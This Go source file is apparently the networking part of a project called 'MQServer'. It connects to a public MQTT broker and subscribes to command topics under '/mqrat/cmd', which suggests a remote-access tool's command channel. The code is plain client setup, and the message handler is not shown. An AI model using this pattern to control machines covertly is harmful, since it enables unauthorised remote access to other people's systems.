package network

import (
	"MQServer/utils"
	"fmt"
	"log"

	MQTT "github.com/eclipse/paho.mqtt.golang"
)

// brokerHostname constains DNS name of mqtt broker
const brokerHostname = "broker.hivemq.com:1883"

const baseTopic = "/mqrat/cmd"

var client MQTT.Client

func Start(QoS byte) {
	// Configure options
	options := MQTT.NewClientOptions()
	options.AddBroker(brokerHostname)
	options.SetClientID(utils.GenerateUUID())

	// Start client
	client = MQTT.NewClient(options)

	// Connect to broker
	token := client.Connect()
	waitForToken(token)

	// Make subscriptions
	token = client.Subscribe(fmt.Sprintf("%v/+", baseTopic), QoS, onMessageReceived)
	waitForToken(token)
}

func Stop() {
	client.Disconnect(5000)
}

func waitForToken(token MQTT.Token) {
	if token.Wait() && token.Error() != nil {
		log.Fatalf("[FATAL] Failed to wait for token: %v", token.Error())
	}
}

func onMessageReceived(client MQTT.Client, message MQTT.Message) {
	go translateMessage(client, message)
}
